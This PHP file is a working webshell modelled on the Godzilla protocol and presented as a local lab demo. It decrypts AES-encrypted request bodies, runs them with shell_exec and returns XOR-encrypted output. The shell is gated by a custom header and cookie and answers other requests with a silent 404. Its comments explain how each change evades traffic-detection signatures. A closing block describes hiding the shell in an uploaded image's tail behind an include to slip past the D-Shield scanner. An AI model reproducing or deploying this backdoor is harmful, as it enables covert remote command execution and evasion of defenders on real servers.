<?php
// 哥斯拉（Godzilla）PHP 型 payload 协议骨架 demo（本地实验环境）
// 声明：仅用于本地实验环境学习对照；协议为哥斯拉式骨架复刻，字段名/熵源/派生规则
//       已全部自定义（与原版字节级协议不互通——这正是魔改点），demo 密钥为示例值。
//
// 原版协议（检测侧打点处）：
//   密钥 = md5(password)[0:16]（静态可推）；
//   请求体 AES-128-ECB 解密执行；
//   回传 = 前 16 字节 MD5(结果)[0:16] 校验头 + 逐字节 XOR 流加密，整体 base64；
//   会话通行证走 Cookie（pass 字段）。
//
// 魔改四路（2025 实战路线）：
//   ① 马结构重构——本文件即是：密钥派生/通行证字段名/熵源/回传头全自定义；
//   ② JAR 反编译重打包——客户端侧 UA/Headers/资源/字符串打乱（马侧无关，见 client-side/）；
//   ③ 加密协议自定——切换加密器组合（AES/XOR/自定义流）+ 密钥派生改造；
//   ④ 文件包含绕 D 盾——马本体走 include 链（见文末变体注释块）。

session_start();
@error_reporting(0);

// ========== 密钥派生（③ 协议自定面） ==========
// 原版：key = md5(pass)[0:16]，pass 为静态口令——流量设备可推解；
// 本 demo：key = md5(自定义头值 . SALT)[0:16]，头名 X-G 非原版字段。
$S = 'g7#m';
if (!isset($_SERVER['HTTP_X_G'])) { http_response_code(404); exit; }
$K = substr(md5($_SERVER['HTTP_X_G'] . $S), 0, 16);

// ========== 会话通行证（Cookie 面，① 字段名/熵源自定义） ==========
$PASS_FIELD = 'sid';                              // 原版 pass 字段弱特征 → 自定义字段名
if (!isset($_SESSION['p'])) {
    // 首包：生成会话通行证并回吐 Set-Cookie；无通行证的新连接不可执行（流量重放无效）
    $_SESSION['p'] = bin2hex(random_bytes(8));    // 熵源：随机字节（原版=弱熵派生）
    setcookie($PASS_FIELD, $_SESSION['p'], 0, '/', '', false, true);
    http_response_code(200);
    exit;
}
// 客户端需保持 PHPSESSID（session 承载通行证真值）+ 回传 sid 字段参与校验
if (!hash_equals($_SESSION['p'], (string)($_COOKIE[$PASS_FIELD] ?? ''))) {
    http_response_code(404); exit;                // 通行证不匹配：静默 404（无错误面泄露）
}

// ========== 请求执行：AES-128-ECB 解密（原版协议保留面，密钥已魔改） ==========
$in = openssl_decrypt(file_get_contents('php://input'), 'AES-128-ECB', $K, OPENSSL_RAW_DATA);
if ($in === false) { exit; }
$r = shell_exec(substr($in, 2));                  // 前 2 字节协议头（demo 占位语义，可自定义）
$r = ($r === null || $r === false) ? '' : (string)$r;

// ========== 回传流加密（哥斯拉式）：MD5 校验头 + XOR 流 + base64 ==========
// 前 16 字节 = MD5(结果)[0:16]：客户端侧完整性校验头。
// ① 结构重构可将其改位/改序/换哈希——打掉"16 字节高熵前缀 + base64 包型"规则
$h = substr(md5($r), 0, 16);
$o = '';
for ($i = 0; $i < strlen($r); $i++) { $o .= $r[$i] ^ $K[$i % 16]; }
echo base64_encode($h . $o);

// ========== ④ 文件包含绕 D 盾（变体注释块，本 demo 未启用） ==========
// 思路：上传面只落"白文件"（零危险函数），真实马本体追加到媒体文件尾部；
//       白文件仅一句 include（省略 PHP 标签示意）——D 盾静态扫描语料面落空：
//     @include('uploads/avatar_202401.png');
// 配套：马本体片段追加在图片尾部（PHP 只解析标签内片段，图片本身不参与）；
//       上传需绕类型校验（文件名/Content-Type 伪装），本 demo 不展开。
